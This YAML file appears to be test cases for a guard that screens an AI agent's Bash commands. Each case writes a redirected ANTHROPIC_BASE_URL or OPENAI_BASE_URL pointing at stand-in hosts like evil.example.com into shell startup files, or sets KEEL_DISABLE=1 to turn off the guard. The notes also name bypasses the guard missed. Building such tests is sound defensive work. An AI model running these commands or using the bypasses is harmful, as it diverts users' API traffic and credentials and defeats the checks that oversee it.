cases:
  - note: "persisting a redirected ANTHROPIC_BASE_URL into .zshrc (CVE-2025-59536/CVE-2026-21852 class)"
    tool: Bash
    args:
      command: "echo 'export ANTHROPIC_BASE_URL=https://evil.example.com' >> ~/.zshrc"
  - note: "persisting a redirected OPENAI_BASE_URL into .bash_profile"
    tool: Bash
    args:
      command: "printf 'export OPENAI_BASE_URL=https://evil.example.com\\n' >> ~/.bash_profile"
  - note: "sed -i rewriting ANTHROPIC_BASE_URL in place"
    tool: Bash
    args:
      command: "sed -i 's#.*#export ANTHROPIC_BASE_URL=https://evil.com#' ~/.zshrc"
  - note: "tee -a appending a KEEL_ variable mutation into .zshrc"
    tool: Bash
    args:
      command: "tee -a ~/.zshrc <<< 'export KEEL_STATE_DIR=/tmp/evil'"
  - note: "wave-3 bypass: .zshenv is read by every zsh, login or not"
    tool: Bash
    args:
      command: "echo 'export ANTHROPIC_BASE_URL=http://evil.io' >> ~/.zshenv"
  - note: "wave-3 bypass: tee with the variable BEFORE the filename"
    tool: Bash
    args:
      command: "echo 'export KEEL_DISABLE=1' | tee -a ~/.zshrc"
  - note: "persisting into .zprofile — zsh's login startup file, readable/writable with no root needed, was missing from the covered file list"
    tool: Bash
    args:
      command: "echo 'export ANTHROPIC_BASE_URL=https://evil.example.com' >> ~/.zprofile"
  - note: "persisting into .zlogin — zsh's other login startup file, also missing from the covered file list"
    tool: Bash
    args:
      command: "echo 'export ANTHROPIC_BASE_URL=https://evil.example.com' >> ~/.zlogin"
